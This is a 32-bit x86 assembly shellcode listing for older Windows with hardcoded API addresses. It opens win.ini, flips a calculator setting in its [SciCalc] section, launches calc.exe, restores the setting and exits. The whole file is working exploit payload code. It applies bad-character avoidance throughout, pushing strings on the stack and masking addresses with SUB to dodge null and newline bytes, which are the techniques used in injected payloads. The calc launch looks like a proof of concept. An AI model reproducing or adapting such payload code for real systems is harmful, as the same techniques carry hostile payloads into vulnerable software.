[BITS 32]
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; Call CreateFileA with C:\windows\win.ini ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
XOR EAX,EAX
MOV AX, 0x696E      ; Push upper byte
PUSH EAX            ; (ni..)
PUSH 0x692e6e69     ; (in.i)
PUSH 0x775c7377     ; (ws\w)
PUSH 0x6f646e69     ; (indo)
PUSH 0x775c3a43     ; (C:\w)
MOV  EDX,ESP        ; Store pointer into EDX
XOR  EAX,EAX        ; Null out EAX
PUSH EAX            ; hTemplateFile = NULL
XOR  EBX,EBX        ; Clear EBX
MOV  BL,0x80        ; Put 0x80 in lower
PUSH EBX            ; PUSH EBX
PUSH byte 0x04      ; 4 = OPEN_ALWAYS
PUSH EAX            ; LPSECURITY = 0
PUSH byte 0x01      ; 1 = SHARE_READ
MOV EAX,0xD1111111  ; Push 0xd1110000
SUB EAX,0x11111111  ; Sub  0x11110000 == 0xc0000000
PUSH EAX            ; Push (GENERIC_READ | GENEREIC_WRITE)
PUSH EDX            ; Filename
MOV  EDX,0x7c802b28 ; Have to mask this for some reason
SUB  DH,0x11        ; Compiler barfs at 1a, and stops :-/
CALL EDX            ; Call CreateFileA()
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; Call GetFileSize([HANDLE]"C:\windows\win.ini") ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
PUSH EAX               ; Push File Handle (later storage)
XOR  ECX,ECX           ; Clear ECX
PUSH ECX               ; Push 0
PUSH EAX               ; Push File Handle argument
MOV  ESI,0x7c810fef    ; Pointer to GetFileSize()
CALL ESI               ; Call GetFileSize()
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; Call malloc() with file size +1 ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
INC  EAX               ; EAX == File size (add one to it for null terminator)
PUSH EAX               ; Push FileSize + 1 as argument
MOV  ESI,0x77c2c407    ; Pointer to malloc() 
CALL ESI               ; Call malloc()
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; Call memset() to zero out all memory ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
XOR  ECX,ECX        ; Clear ECX
MOV  EDX,[ESP]      ; Put FileSize + 1 as the buffer size into EDX
PUSH EDX            ; Push FileSize + 1 as an argument
PUSH ECX            ; Fill with 0's
PUSH EAX            ; Start at begining of malloc()'d memory
MOV  ESI,0x77c475f0 ; Pointer to memset()
CALL ESI            ; Call memset()
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;
;; Random Juggle time! ;;
;;;;;;;;;;;;;;;;;;;;;;;;;
MOV  ECX,[ESP-0x10]     ; Put file size into ECX
PUSH ECX                ; Push a dummy value so we don't try ESP+10 (has a \x0a in it :-/)
MOV  EDX,[ESP+0x14]     ; Put file handle to EDX
;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; Call ReadFileA('C:\windows\win.ini') into malloc() from above ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
XOR  ESI,ESI        ; Clear ESI
PUSH ESI            ; Push a null onto the stack (address to be saved later)
PUSH ESI            ; (NULL)  _Inout_opt_  LPOVERLAPPED lpOverlapped
MOV  ESI,ESP        ; Move ESP -> ESI
ADD  ESI, byte 0x04 ; Subtract 0x04 from our ESP
PUSH ESI            ; (Pointer to 0x0)  _Out_opt_    LPDWORD lpNumberOfBytesRead,
PUSH ECX            ; (FSiZ)  _In_         DWORD nNumberOfBytesToRead,
PUSH EAX            ; (BUFF)  _Out_        LPVOID lpBuffer,
PUSH EDX            ; (HNDL)  _In_         HANDLE hFile,
MOV  ESI,0x7c801812 ; Pointer to ReadFileA()
CALL ESI            ; Call ReadFileA()
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; Call strstr('[SciCalc]',$filecontents) ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
MOV  EAX,[ESP-0x10]   ; Pop out location to the file contents into EAX
PUSH byte 0x5d        ; 0x0000005d (   ]) ;)
PUSH 0x636c6143       ; (Calc)
PUSH 0x6963535b       ; ([Sci)
MOV  EBX,ESP          ; Put pointer to our string into EBX
PUSH EBX              ; String to be Scanned
PUSH EAX              ; String to match
MOV  ESI,0x77c47c60   ; Pointer to strstr()
CALL ESI			  ; Call strstr()
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; Set our byte to 0 with memset() ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
ADD EAX, byte 0x12                  ; Move pointer 0x12 ahead (skip to 0/1)
PUSH byte 0x01                      ; Change one byte
PUSH byte 0x30                      ; Char to change to 0x30 (ascii "0")
PUSH EAX                            ; Push Memory location to change
MOV ESI,0x77c475f0                  ; Pointer to memset()
CALL ESI                            ; Call memset()
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; Call setFilePointer() to reset ;;
;; file pointer to begining       ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
MOV  EDX,[ESP+0x38]                ; Find handle on stack
XOR  EAX,EAX                       ; Clear EAX
PUSH EAX                           ; dwMoveMethod (FILE_BEGIN)
PUSH EAX                           ; lpDistanceToMoveHigh (0)
PUSH EAX                           ; lDistanceToMove (0)
PUSH EDX                           ; hFile
MOV  ESI,0x7c811106                ; Call setFilePointer()
CALL ESI                           ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;
;; Call writeFile() ;;
;;;;;;;;;;;;;;;;;;;;;;
XOR  EAX,EAX         ; Blank out EAX
PUSH EAX             ; lpOverlapped = NULL
MOV  EAX,ESP         ; Push current stack pointer as a "NumberOfBytesWritten" variable
XOR  ECX,ECX         ; Blank out ECX
PUSH ECX             ; lpOverlapped == NULL
PUSH EAX             ; lpNumberOfBytesWritten == Pointer -> 0
MOV  ECX,[ESP+0x2C]  ; Move file size into ECX
MOV  EDX,[ESP+0x18]  ; Move pointer to file data into EDX
MOV  ESI,[ESP+0x44]  ; Move file handle into ESI
PUSH ECX             ; nNumberOfBytesToWrite
PUSH EDX             ; lpBuffer
PUSH ESI             ; hFile
MOV  ESI,0x7c8112ff  ; Call writeFile()
CALL ESI             ; 
;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;
;; WinExec('calc.exe') ;;
;;;;;;;;;;;;;;;;;;;;;;;;;
XOR  EAX,EAX            ; Clear EAX
PUSH EAX                ; Null terminate string
PUSH 0x6578652e         ; (.exe)
PUSH 0x636c6163         ; (calc)
PUSH ESP                ; Stack pointer == our data
MOV  ESI,0x7c862585     ; Call WinExec()
CALL ESI                ; 
;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; Set our byte back to 1 with memset() ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
MOV EAX,[ESP+0x0C]					     ; Push pointer to 0
PUSH byte 0x01                           ; Change one byte
PUSH byte 0x31                           ; Char to change to 0x30 (ascii "0")
PUSH EAX                                 ; Push Memory location to change
MOV  ESI,0x77c475f0                      ; Call memset()
CALL ESI                                 ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; Call setFilePointer() to reset ;;
;; file pointer to begining       ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
MOV  EDX,[ESP+0x50]                ; Find handle on stack
XOR  EAX,EAX                       ; Clear EAX
PUSH EAX                           ; dwMoveMethod (FILE_BEGIN)
PUSH EAX                           ; lpDistanceToMoveHigh (0)
PUSH EAX                           ; lDistanceToMove (0)
PUSH EDX                           ; hFile
MOV  ESI,0x7c811106                ; Call setFilePointer()
CALL ESI                           ; 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; Call sleep(500) to allow calc to start up and read conf ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
PUSH byte 0x79        ; Sleep 121 ms
MOV  ESI, 0x7c802446  ; Load Sleep()
CALL ESI              ; Call Sleep()
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;
;; Call writeFile() ;;
;;;;;;;;;;;;;;;;;;;;;;
MOV  EAX,ESP         ; Push current stack pointer as a "NumberOfBytesWritten" variable
XOR EDX,EDX          ; Clear EDX
PUSH EDX             ; lpOverlapped == NULL
PUSH EAX             ; lpNumberOfBytesWritten == Pointer -> 0
MOV  ECX,[ESP+0x1C]  ; Move file size into ECX
MOV  EDX,[ESP+0x2C]  ; Move pointer to file data into EDX
MOV  ESI,[ESP+0x58]  ; Move file handle into ESI
PUSH ECX             ; nNumberOfBytesToWrite
PUSH EDX             ; lpBuffer
PUSH ESI             ; hFile
MOV  ESI,0x7c8112ff  ; Call writeFile()
CALL ESI             ; 
;;;;;;;;;;;;;;;;;;;;;;
	
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; CloseHandle(fileHandle) ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
MOV  EAX,[ESP-0x14]         ; Find handle
PUSH EAX                    ; Push handle onto stack
MOV  ESI,0x7c809be7         ; Call CloseHandle() 
CALL ESI                    ; 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;
;; Call ExitProccess(0) ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;
XOR  EAX,EAX             ; Clear EAX
PUSH EAX                 ; Push 0x00 (exit(0))
MOV  EAX,0x7c81d21b      ; Avoid \x0a character
SUB  AL, 0x11            ; Add mask
JMP  EAX                 ; JMP - No turning back!
;;;;;;;;;;;;;;;;;;;;;;;;;;